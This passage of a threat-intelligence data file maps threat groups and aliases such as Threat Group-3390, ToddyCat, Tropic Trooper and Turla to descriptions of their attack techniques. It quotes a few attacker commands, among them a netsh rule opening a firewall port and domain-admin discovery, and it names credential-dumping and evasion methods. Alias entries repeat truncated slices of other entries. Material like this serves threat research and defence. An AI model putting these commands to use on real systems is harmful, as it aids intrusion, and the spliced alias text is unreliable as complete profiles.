Mimikatz and PsExec., In the Triton Safety Instrumented System Attack, TEMP.Veles used Mimikatz.During the C0032 campaign, TEMP.Veles used Mimikatz and a custom tool, SecHack, to harvest credentials., During the C0032 campaign, TEMP.Veles used Mimikatz and a custom tool, SecHack, to harvest credentials., During the C0032 campaign, TEMP.Veles used encrypted SSH-based PLINK tunnels to transfer tools and enable RDP connections throughout the environment., During the C0032 campaign, TEMP.Veles utilized RDP throughout an operation., During the C0032 campaign, TEMP.Veles relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution., In the Triton Safety Instrumented System Attack, TEMP.Veles installed scheduled tasks defined in XML files.During the C0032 campaign, TEMP.Veles used scheduled task XML triggers., During the C0032 campaign, TEMP.Veles used scheduled task XML triggers., During the C0032 campaign, TEMP.Veles planted Web shells on Outlook Exchange servers., During the C0032 campaign, TEMP.Veles used compromised VPN accounts., In the Triton Safety Instrumented System Attack, TEMP.Veles changed phone numbers tied to certain specific accounts in a designated contact list. They then used the changed phone numbers to redirect network traffic to websites controlled by them, thereby allowing them to capture and use any login codes sent to the devices via text message., In the Triton Safety Instrumented System Attack, TEMP.Veles’ tool took one option from the command line, which was a single IP address of the target Triconex device., TEMP.Veles utilizes watering hole websites to target industrial employees. , In the Triton Safety Instrumented System Attack, TEMP.Veles would programmatically return the controller to a normal running state if the Triton malware failed. If the controller could not recover in a defined time window, TEMP.Veles programmatically overwrote their malicious program with invalid data., In the Triton Safety Instrumented System Attack, TEMP.Veles made attempts on multiple victim machines to transfer and execute the WMImplant tool., In the Triton Safety Instrumented System Attack, TEMP.Veles tripped a controller into a failed safe state, which caused an automatic shutdown of the plant, this resulted in a pause of plant operations for more than a week. Thereby impacting industrial processes and halting productivity., In the Triton Safety Instrumented System Attack, TEMP.Veles downloaded multiple rounds of control logic to the Safety Instrumented System (SIS) controllers through a program append operation., In the Triton Safety Instrumented System Attack, TEMP.Veles utilized remote desktop protocol (RDP) jump boxes, poorly configured OT firewalls , along with other traditional malware backdoors, to move into the ICS environment., In the Triton Safety Instrumented System Attack, TEMP.Veles used a publicly available PowerShell-based tool, WMImplant., TEMP.Veles targeted several ICS vendors and manufacturers. , In the Triton Safety Instrumented System Attack, TEMP.Veles leveraged Triton to send unauthorized command messages to the Triconex safety controllers., In the Triton Safety Instrumented System Attack, TEMP.Veles used valid credentials when laterally moving through RDP jump boxes into the ICS environment.",
    "XENOTIME": "In the Triton Safety Instrumented System Attack, TEMP.Veles engaged in network reconnaissance against targets of interest., In the Triton Safety Instrumented System Attack, TEMP.Veles used a publicly available PowerShell-based tool, WMImplant.During the C0032 campaign, TEMP.Veles used PowerShell to perform timestomping., During the C0032 campaign, TEMP.Veles used PowerShell to perform timestomping., During the C0032 campaign, TEMP.Veles used staging folders that are infrequently used by legitimate users or processes to store data for exfiltration and tool deployment., In the Triton Safety Instrumented System Attack, TEMP.Veles developed, prior to the attack, malware capabilities that would require access to specific and specialized hardware and software., In the Triton Safety Instrumented System Attack, TEMP.Veles used cryptcat binaries to encrypt their traffic., During the C0032 campaign, TEMP.Veles modified and added entries within HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options to maintain persistence., During the C0032 campaign, TEMP.Veles used VPN access to persist in the victim environment., During the C0032 campaign, TEMP.Veles routinely deleted tools, logs, and other files after they were finished with them., During the C0032 campaign, TEMP.Veles used timestomping to modify the $STANDARD_INFORMATION attribute on tools., In the Triton Safety Instrumented System Attack, TEMP.Veles captured credentials as they were being changed by redirecting text-based login codes to websites they controlled., In the Triton Safety Instrumented System Attack, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.During the C0032 campaign, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files., During the C0032 campaign, TEMP.",
    "The White Company": "The White Company is a likely state-sponsored threat actor with advanced capabilities. From 2017 through 2018, the group led an espionage campaign called Operation Shaheen targeting government and military organizations in Pakistan., The White Company has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code., The White Company has the ability to delete its malware entirely from the target system., The White Company has obfuscated their payloads through packing., The White Company has sent phishing emails with malicious Microsoft Word attachments to victims., The White Company has checked for specific antivirus products on the target’s computer, including Kaspersky, Quick Heal, AVG, BitDefender, Avira, Sophos, Avast!, and ESET., The White Company has checked the current date on the victim system., The White Company has used phishing lure documents that trick users into opening them and infecting their computers.",
    "Threat Group-1314": "Threat Group-1314 is an unattributed threat group that has used compromised credentials to log into a victim's remote access infrastructure. , , Threat Group-1314 actors spawned shells on remote systems on a victim network to execute commands., Threat Group-1314 actors mapped network drives using net use., Threat Group-1314 actors used a victim's endpoint management platform, Altiris, for lateral movement., Threat Group-1314 actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally.",
    "Threat Group-3390": "Threat Group-3390 is a Chinese threat group that has extensively used strategic Web compromises to target victims. The group has been active since at least 2010 and has targeted organizations in the aerospace, government, defense, technology, energy, manufacturing and gambling/betting sectors., , , , , , , , A Threat Group-3390 tool can use a public UAC bypass method to elevate privileges., Threat Group-3390 has used net user to conduct internal discovery of systems., Threat Group-3390 has registered domains for C2., Threat Group-3390 malware has used HTTP for C2., Threat Group-3390 has used RAR to compress, encrypt, and password-protect files prior to exfiltration., Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories., Threat Group-3390's malware can add a Registry key to Software/Microsoft/Windows/CurrentVersion/Run for persistence., Threat Group-3390 has used PowerShell for execution., Threat Group-3390 has used command-line interfaces for execution., Threat Group-3390's malware can create a new service, sometimes naming it after the config information, to gain persistence., Threat Group-3390 obtained a KeePass database from a compromised host., Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories., Threat Group-3390 has locally staged encrypted archives for later exfiltration efforts., Threat Group-3390 has moved staged encrypted archives to Internet-facing servers that had previously been compromised with China Chopper prior to exfiltration., Threat Group-3390 actors have split RAR files for exfiltration into parts., During execution, Threat Group-3390 malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression., Threat Group-3390 has extensively used strategic web compromises to target victims., Threat Group-3390 has exfiltrated stolen data to Dropbox., Threat Group-3390 has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server., Threat Group-3390 has exploited CVE-2018-0798 in Equation Editor., Threat Group-3390 has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges., Threat Group-3390 has exploited MS17-010 to move laterally to other systems on the network. , Threat Group-3390 actors look for and use VPN profiles during an operation to access the network using external VPN services. Threat Group-3390 has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network., Threat Group-3390 has performed DLL search order hijacking to execute their payload., Threat Group-3390 has used DLL side-loading, including by using legitimate Kaspersky antivirus variants as well as rc.exe, a legitimate Microsoft Resource Compiler., Threat Group-3390 has used appcmd.exe to disable logging on a victim server., Threat Group-3390 has deleted existing logs and exfiltrated file archives from a victim., Threat Group-3390 has detached network shares after exfiltrating files, likely to evade detection., Threat Group-3390 has downloaded additional malware and tools, including through the use of certutil, onto a compromised host ., Threat Group-3390 actors installed a credential logger on Microsoft Exchange servers. Threat Group-3390 also leveraged the reconnaissance framework, ScanBox, to capture keystrokes., A Threat Group-3390 tool has created new Registry keys under HKEY_CURRENT_USER/Software/Classes/ and HKLM/SYSTEM/CurrentControlSet/services., Threat Group-3390 actors use the Hunter tool to conduct network service discovery for vulnerable systems., Threat Group-3390 has packed malware and tools, including using VMProtect., A Threat Group-3390 tool can encrypt payloads using XOR. Threat Group-3390 malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression., Threat Group-3390 has obtained and used tools such as Impacket, pwdump, Mimikatz, gsecdump, NBTscan, and Windows Credential Editor., Threat Group-3390 has obtained stolen valid certificates, including from VMProtect and the Chinese instant messaging application Youdu, for their operations., Threat Group-3390 actors have used a modified version of Mimikatz called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers., Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers., Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers., Threat Group-3390 has used e-mail to deliver malicious attachments to victims., A Threat Group-3390 tool can spawn svchost.exe and inject the payload into that process., A Threat Group-3390 tool can read and decrypt stored Registry values., Threat Group-3390 has used WinRM to enable remote execution., Threat Group-3390 has used the net view command., Threat Group-3390 actors use at to schedule tasks to run self-extracting RAR archives, which install HTTPBrowser or PlugX on other victims on a network., Threat Group-3390 has used a variety of Web shells., Threat Group-3390 has hosted malicious payloads on Dropbox., Threat Group-3390 has staged tools, including gsecdump and WCE, on previously compromised websites., Threat Group-3390 has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest., Threat Group-3390 has compromised the Able Desktop installer to gain access to victim's environments., Threat Group-3390 actors use NBTscan to discover vulnerable systems., Threat Group-3390 has used net use and netstat to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim., Threat Group-3390 has used whoami to collect system user information., Threat Group-3390 has compromised third party service providers to gain access to victim's environments., Threat Group-3390 has lured victims into opening malicious files containing malware., Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks., A Threat Group-3390 tool can use WMI to execute a binary.",
    "Earth Smilodon": "The group has been active since at least 2010 and has targeted organizations in the aerospace, government, defense, technology, energy, manufacturing and gambling/betting sectors., , , , , , , , A Threat Group-3390 tool can use a public UAC bypass method to elevate privileges., Threat Group-3390 has used net user to conduct internal discovery of systems., Threat Group-3390 has registered domains for C2., Threat Group-3390 malware has used HTTP for C2., Threat Group-3390 has used RAR to compress, encrypt, and password-protect files prior to exfiltration., Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories., Threat Group-3390's malware can add a Registry key to Software/Microsoft/Windows/CurrentVersion/Run for persistence., Threat Group-3390 has used PowerShell for execution., Threat Group-3390 has used command-line interfaces for execution., Threat Group-3390's malware can create a new service, sometimes naming it after the config information, to gain persistence., Threat Group-3390 obtained a KeePass database from a compromised host., Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories., Threat Group-3390 has locally staged encrypted archives for later exfiltration efforts., Threat Group-3390 has moved staged encrypted archives to Internet-facing servers that had previously been compromised with China Chopper prior to exfiltration., Threat Group-3390 actors have split RAR files for exfiltration into parts.",
    "TG-3390": "Threat Group-3390 has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network., Threat Group-3390 has performed DLL search order hijacking to execute their payload., Threat Group-3390 has used DLL side-loading, including by using legitimate Kaspersky antivirus variants as well as rc.exe, a legitimate Microsoft Resource Compiler., Threat Group-3390 has used appcmd.exe to disable logging on a victim server., Threat Group-3390 has deleted existing logs and exfiltrated file archives from a victim., Threat Group-3390 has detached network shares after exfiltrating files, likely to evade detection., Threat Group-3390 has downloaded additional malware and tools, including through the use of certutil, onto a compromised host ., Threat Group-3390 actors installed a credential logger on Microsoft Exchange servers. Threat Group-3390 also leveraged the reconnaissance framework, ScanBox, to capture keystrokes., A Threat Group-3390 tool has created new Registry keys under HKEY_CURRENT_USER/Software/Classes/ and HKLM/SYSTEM/CurrentControlSet/services., Threat Group-3390 actors use the Hunter tool to conduct network service discovery for vulnerable systems., Threat Group-3390 has packed malware and tools, including using VMProtect., A Threat Group-3390 tool can encrypt payloads using XOR. Threat Group-3390 malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression., Threat Group-3390 has obtained and used tools such as Impacket, pwdump, Mimikatz, gsecdump, NBTscan, and Windows Credential Editor.",
    "Emissary Panda": "Threat Group-3390 has obtained stolen valid certificates, including from VMProtect and the Chinese instant messaging application Youdu, for their operations., Threat Group-3390 actors have used a modified version of Mimikatz called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers., Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers., Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers., Threat Group-3390 has used e-mail to deliver malicious attachments to victims., A Threat Group-3390 tool can spawn svchost.exe and inject the payload into that process., A Threat Group-3390 tool can read and decrypt stored Registry values., Threat Group-3390 has used WinRM to enable remote execution., Threat Group-3390 has used the net view command., Threat Group-3390 actors use at to schedule tasks to run self-extracting RAR archives, which install HTTPBrowser or PlugX on other victims on a network., Threat Group-3390 has used a variety of Web shells., Threat Group-3390 has hosted malicious payloads on Dropbox., Threat Group-3390 has staged tools, including gsecdump and WCE, on previously compromised websites., Threat Group-3390 has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest., Threat Group-3390 has compromised the Able Desktop installer to gain access to victim's environments., Threat Group-3390 actors use NBTscan to discover vulnerable systems., Threat Group-3390 has used net use and netstat to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim., Threat Group-3390 has used whoami to collect system user information., Threat Group-3390 has compromised third party service providers to gain access to victim's environments., Threat Group-3390 has lured victims into opening malicious files containing malware., Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks., A Threat Group-3390 tool can use WMI to execute a binary.",
    "Thrip": "Thrip is an espionage group that has targeted satellite communications, telecoms, and defense contractor companies in the U.S. and Southeast Asia. The group uses custom malware as well as 'living off the land' techniques. , Thrip leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance., Thrip has used WinSCP to exfiltrate data from a targeted organization over FTP., Thrip has obtained and used tools such as Mimikatz and PsExec., Thrip used a cloud-based remote access software called LogMeIn for their attacks.",
    "ToddyCat": "ToddyCat is a sophisticated threat group that has been active since at least 2020 using custom loaders and malware in multi-stage infection chains against government and military targets across Europe and Asia., ToddyCat has run net user %USER% /dom for account discovery., ToddyCat has leveraged  xcopy, 7zip, and RAR to stage and compress collected documents prior to exfiltration., ToddyCat has used Powershell scripts to perform post exploit collection., ToddyCat has used .bat scripts and cmd for execution on compromised hosts., ToddyCat has run scripts to collect documents from targeted hosts., ToddyCat manually transferred collected files to an exfiltration host using xcopy., ToddyCat has used a DropBox uploader to exfiltrate stolen files., ToddyCat has exploited the ProxyLogon vulnerability (CVE-2021-26855) to compromise Exchange Servers at multiple organizations., ToddyCat has run scripts to enumerate recently modified documents having either a .pdf, .doc, .docx, .xls or .xlsx extension., ToddyCat has hidden malicious scripts using powershell.exe -windowstyle hidden. , Prior to executing a backdoor ToddyCat  has run cmd /c start /b netsh advfirewall firewall add rule name='SGAccessInboundRule' dir=in protocol=udp action=allow localport=49683 to allow the targeted system to receive UDP packets on port 49683., ToddyCat has used the name debug.exe for malware components., ToddyCat has used WinExec to execute commands received from C2 on compromised hosts., ToddyCat has used a passive backdoor that receives commands with UDP packets., ToddyCat has executed net group 'domain admins' /dom for discovery on compromised machines., ToddyCat has sent loaders configured to run Ninja as zip archives via Telegram., ToddyCat has run cmd /c start /b tasklist to enumerate processes., ToddyCat has used locally mounted network shares for lateral movement through targated environments., ToddyCat has used ping %REMOTE_HOST% for post exploit discovery., ToddyCat has used scheduled tasks to execute discovery commands and scripts for collection., ToddyCat can determine is Kaspersky software is running on an endpoint by running cmd /c wmic process where name='avp.exe'., ToddyCat has collected information on bootable drives including model, vendor, and serial numbers., ToddyCat has used netstat -anop tcp to discover TCP connections to compromised hosts., ToddyCat has used compromised domain admin credentials to mount local network shares., ToddyCat has used WMI to execute scripts for post exploit document collection.",
    "Tonto Team": "Tonto Team is a suspected Chinese state-sponsored cyber espionage threat group that has primarily targeted South Korea, Japan, Taiwan, and the United States since at least 2009; by 2020 they expanded operations to include other Asian as well as Eastern European countries. Tonto Team has targeted government, military, energy, mining, financial, education, healthcare, and technology organizations, including through the Heartbeat Campaign (2009-2012) and Operation Bitter Biscuit (2017)., , , , , Tonto Team has used PowerShell to download additional payloads., Tonto Team has used Python-based tools for execution. , Tonto Team has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads. , Tonto Team has exploited CVE-2019-0803 and MS16-032 to escalate privileges., Tonto Team has used EternalBlue exploits for lateral movement., Tonto Team abuses a legitimate and signed Microsoft executable to launch a malicious DLL., Tonto Team has downloaded malicious DLLs which served as a ShadowPad loader., Tonto Team has used keylogging tools in their operations., Tonto Team has used tools such as NBTscan to enumerate network shares., Tonto Team has used a variety of credential dumping tools. , Tonto Team has used the ShowLocalGroupDetails command to identify administrator, user, and guest accounts on a compromised host., Tonto Team has delivered payloads via spearphishing attachments., Tonto Team has routed their traffic through an external server in order to obfuscate their location., Tonto Team has used a first stage web shell after compromising a vulnerable Exchange server., Tonto Team has relied on user interaction to open their malicious RTF documents.",
    "Transparent Tribe": "Transparent Tribe is a suspected Pakistan-based threat group that has been active since at least 2013, primarily targeting diplomatic, defense, and research organizations in India and Afghanistan., , , , , , Transparent Tribe has registered domains to mimic file sharing, government, defense, and research websites for use in targeted campaigns.For C0011, Transparent Tribe registered domains likely designed to appear relevant to student targets in India., For C0011, Transparent Tribe registered domains likely designed to appear relevant to student targets in India., Transparent Tribe has crafted VBS-based malicious documents. For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host., For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host., Transparent Tribe has compromised domains for use in targeted malicious campaigns., For C0011, Transparent Tribe established SSL certificates on the typo-squatted domains the group registered., Transparent Tribe has used websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools., Transparent Tribe has used dynamic DNS services to set up C2., Transparent Tribe has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution., Transparent Tribe can hide legitimate directories and replace them with malicious copies of the same name., Transparent Tribe can mimic legitimate Windows directories by using the same icons and names., Transparent Tribe has dropped encoded executables on compromised hosts., Transparent Tribe has sent spearphishing e-mails with attachments to deliver malicious payloads. During C0011, Transparent Tribe sent malicious attachments via email to student targets in India. , During C0011, Transparent Tribe sent malicious attachments via email to student targets in India. , Transparent Tribe has embedded links to malicious downloads in e-mails.During C0011, Transparent Tribe sent emails containing a malicious link to student targets in India., During C0011, Transparent Tribe sent emails containing a malicious link to student targets in India., For C0011, Transparent Tribe hosted malicious documents on domains registered by the group. , Transparent Tribe has set up websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools., Transparent Tribe has directed users to open URLs hosting malicious content.During C0011, Transparent Tribe relied on student targets to click on a malicious link sent via email., During C0011, Transparent Tribe relied on student targets to click on a malicious link sent via email., Transparent Tribe has used weaponized documents in e-mail to compromise targeted systems.During C0011, Transparent Tribe relied on a student target to open a malicious document delivered via email., During C0011, Transparent Tribe relied on a student target to open a malicious document delivered via email.",
    "COPPER FIELDSTONE": "Transparent Tribe has registered domains to mimic file sharing, government, defense, and research websites for use in targeted campaigns.For C0011, Transparent Tribe registered domains likely designed to appear relevant to student targets in India., For C0011, Transparent Tribe registered domains likely designed to appear relevant to student targets in India., Transparent Tribe has crafted VBS-based malicious documents. For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host., For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host., Transparent Tribe has compromised domains for use in targeted malicious campaigns., For C0011, Transparent Tribe established SSL certificates on the typo-squatted domains the group registered., Transparent Tribe has used websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.",
    "APT36": "Transparent Tribe has used dynamic DNS services to set up C2., Transparent Tribe has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution., Transparent Tribe can hide legitimate directories and replace them with malicious copies of the same name., Transparent Tribe can mimic legitimate Windows directories by using the same icons and names., Transparent Tribe has dropped encoded executables on compromised hosts., Transparent Tribe has sent spearphishing e-mails with attachments to deliver malicious payloads. During C0011, Transparent Tribe sent malicious attachments via email to student targets in India. , During C0011, Transparent Tribe sent malicious attachments via email to student targets in India. , Transparent Tribe has embedded links to malicious downloads in e-mails.During C0011, Transparent Tribe sent emails containing a malicious link to student targets in India., During C0011, Transparent Tribe sent emails containing a malicious link to student targets in India., For C0011, Transparent Tribe hosted malicious documents on domains registered by the group. , Transparent Tribe has set up websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools., Transparent Tribe has directed users to open URLs hosting malicious content.",
    "Tropic Trooper": "Tropic Trooper is an unaffiliated threat group that has led targeted campaigns against targets in Taiwan, the Philippines, and Hong Kong. Tropic Trooper focuses on targeting government, healthcare, transportation, and high-tech industries and has been active since 2011., , , Tropic Trooper has used HTTP in communication with the C2., Tropic Trooper's backdoor has communicated to the C2 over the DNS protocol. , Tropic Trooper has collected information automatically using the adversary's USBferry attack. , Tropic Trooper has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage. , Tropic Trooper has created shortcuts in the Startup folder to establish persistence., Tropic Trooper has created the Registry key HKCU/Software/Microsoft/Windows NT/CurrentVersion/Winlogon/Shell and sets the value to establish persistence., Tropic Trooper has used Windows command scripts. , Tropic Trooper has installed a service pointing to a malicious DLL dropped to disk., Tropic Trooper has used base64 encoding to hide command strings delivered from the C2., Tropic Trooper used shellcode with an XOR algorithm to decrypt a payload. Tropic Trooper also decrypted image files which contained a payload., Tropic Trooper has encrypted traffic with the C2 to prevent network detection., Tropic Trooper has used SSL to connect to C2 servers., Tropic Trooper has exfiltrated data using USB storage devices. , Tropic Trooper has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158., Tropic Trooper has monitored files' modified time. , Tropic Trooper has created a hidden directory under C:/ProgramData/Apple/Updates/ and C:/Users/Public/Documents/Flash/., Tropic Trooper has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools., Tropic Trooper has deleted dropper files on an infected system using command scripts. , Tropic Trooper has used a delivered trojan to download additional files., Tropic Trooper has hidden payloads in Flash directories and fake installer files., Tropic Trooper has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl., Tropic Trooper used pr and an openly available tool to scan for open ports on target systems., Tropic Trooper used netview to scan target systems for shared resources., Tropic Trooper has used JPG files with encrypted payloads to mask their backdoor routines and evade detection., Tropic Trooper has encrypted configuration files., Tropic Trooper sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments., Tropic Trooper is capable of enumerating the running processes on the system using pslist., Tropic Trooper has injected a DLL backdoor into dllhost.exe and svchost.exe., Tropic Trooper has attempted to transfer USBferry from an infected USB device by copying an Autorun function to the target machine., Tropic Trooper has started a web service in the target host and wait for the adversary to connect, acting as a web shell. , Tropic Trooper's backdoor could list the infected system's installed software., Tropic Trooper can search for anti-virus software running on the system., Tropic Trooper has detected a target system’s OS version and system volume information., Tropic Trooper has used scripts to collect the host's network topology. , Tropic Trooper has tested if the localhost network is available and other connection capability on an infected system using command scripts. , Tropic Trooper used letmein to scan for saved usernames on the target system., Tropic Trooper delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document., Tropic Trooper has lured victims into executing malware via malicious e-mail attachments., Tropic Trooper has used known administrator account credentials to execute the backdoor directly.",
    "Pirate Panda": "Tropic Trooper has collected information automatically using the adversary's USBferry attack. , Tropic Trooper has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage. , Tropic Trooper has created shortcuts in the Startup folder to establish persistence., Tropic Trooper has created the Registry key HKCU/Software/Microsoft/Windows NT/CurrentVersion/Winlogon/Shell and sets the value to establish persistence., Tropic Trooper has used Windows command scripts. , Tropic Trooper has installed a service pointing to a malicious DLL dropped to disk., Tropic Trooper has used base64 encoding to hide command strings delivered from the C2., Tropic Trooper used shellcode with an XOR algorithm to decrypt a payload. Tropic Trooper also decrypted image files which contained a payload., Tropic Trooper has encrypted traffic with the C2 to prevent network detection., Tropic Trooper has used SSL to connect to C2 servers., Tropic Trooper has exfiltrated data using USB storage devices. , Tropic Trooper has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158., Tropic Trooper has monitored files' modified time. , Tropic Trooper has created a hidden directory under C:/ProgramData/Apple/Updates/ and C:/Users/Public/Documents/Flash/.",
    "KeyBoy": "Tropic Trooper has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools., Tropic Trooper has deleted dropper files on an infected system using command scripts. , Tropic Trooper has used a delivered trojan to download additional files., Tropic Trooper has hidden payloads in Flash directories and fake installer files., Tropic Trooper has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl., Tropic Trooper used pr and an openly available tool to scan for open ports on target systems., Tropic Trooper used netview to scan target systems for shared resources., Tropic Trooper has used JPG files with encrypted payloads to mask their backdoor routines and evade detection., Tropic Trooper has encrypted configuration files., Tropic Trooper sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments., Tropic Trooper is capable of enumerating the running processes on the system using pslist., Tropic Trooper has injected a DLL backdoor into dllhost.exe and svchost.exe., Tropic Trooper has attempted to transfer USBferry from an infected USB device by copying an Autorun function to the target machine., Tropic Trooper has started a web service in the target host and wait for the adversary to connect, acting as a web shell. , Tropic Trooper's backdoor could list the infected system's installed software., Tropic Trooper can search for anti-virus software running on the system., Tropic Trooper has detected a target system’s OS version and system volume information., Tropic Trooper has used scripts to collect the host's network topology. , Tropic Trooper has tested if the localhost network is available and other connection capability on an infected system using command scripts. , Tropic Trooper used letmein to scan for saved usernames on the target system., Tropic Trooper delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document., Tropic Trooper has lured victims into executing malware via malicious e-mail attachments.",
    "Turla": "Turla is a cyber espionage threat group that has been attributed to Russia's Federal Security Service (FSB).  They have compromised victims in over 50 countries since at least 2004, spanning a range of industries including government, embassies, military, education, research and pharmaceutical companies. Turla is known for conducting watering hole and spearphishing campaigns, and leveraging in-house tools and malware, such as Uroburos., , , Based similarity in TTPs and malware used, Turla and Waterbug appear to be the same group., WhiteBear is a designation used by Securelist to describe a cluster of activity that has overlaps with activity described by others as Turla, but appears to have a separate focus., , , , , , Turla RPC backdoors can impersonate or steal process tokens before executing commands. , Turla has used net user to enumerate local accounts on the system., Turla has used net user /domain to enumerate domain accounts., Turla has created web accounts including Dropbox and GitHub for C2 and document exfiltration., Turla has used HTTP and HTTPS for C2 communications., Turla has used multiple backdoors which communicate with a C2 server via email attachments., Turla has encrypted files stolen from connected USB drives into a RAR file before exfiltration., A Turla Javascript backdoor added a local_update_check value under the Registry key HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence., Turla established persistence by adding a Shell value under the Registry key HKCU/Software/Microsoft/Windows NT/CurrentVersion/Winlogon., Turla may attempt to connect to systems within a victim's network using net use commands and a predefined list or collection of passwords., Turla has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from Empire's PSInject. Turla has also used PowerShell scripts to load and execute malware in memory., Turla RPC backdoors have used cmd.exe to execute commands., Turla has used VBS scripts throughout its operations. , Turla has used IronPython scripts as part of the IronNetInjector toolchain to drop payloads., Turla has used various JavaScript-based backdoors. , Turla has used the VPS infrastructure of compromised Iranian threat actors., Turla has used compromised servers as infrastructure., Turla has frequently used compromised WordPress sites for C2 infrastructure., Turla has gathered credentials from the Windows Credential Manager tool. , Turla has used a custom .NET tool to collect documents from an organization's internal central database., Turla RPC backdoors can upload files from victim machines., Turla RPC backdoors can collect files from USB thumb drives., Turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads., Turla has developed its own unique malware for use in operations., Turla has infected victims using watering holes., Turla has used WMI event filters and consumers to establish persistence., Turla has used PowerShell profiles to maintain persistence on an infected machine., Turla has used WebDAV to upload stolen USB files to a cloud drive. Turla has also exfiltrated stolen files to OneDrive and 4shared., Turla has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges., Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent. Turla RPC backdoors have also searched for files matching the lPH*.dll pattern., Turla surveys a system upon check-in to discover Group Policy details using the gpresult command., Turla has placed LunarWeb install files into directories that are excluded from scanning., Turla has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products., Turla has used shellcode to download Meterpreter after compromising a victim., Turla RPC backdoors can be used to transfer files to/from victim machines on the local network., Turla has named components of LunarWeb to mimic Zabbix agent logs., Turla has modified Registry values to store payloads., Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes., Based on comparison of Gazer versions, Turla made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe., Turla has used encryption (including salted 3DES via PowerSploit's Out-EncryptedScript.ps1), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads., Turla has used the Registry to store encrypted and encoded payloads., Turla has used malware obtained after compromising other threat actors, such as OilRig., Turla has obtained and customized publicly-available tools like Mimikatz., Turla has used net accounts and net accounts /domain to acquire password policy information., Turla has used fsutil fsinfo drives to list connected drives., Turla has used net localgroup and net localgroup Administrators to enumerate group information, including members of the local administrators group., Turla has used net group 'Domain Admins' /domain to identify domain administrators., Turla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access., Turla surveys a system upon check-in to discover running processes using the tasklist /v command. Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes., Turla has also used PowerSploit's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell 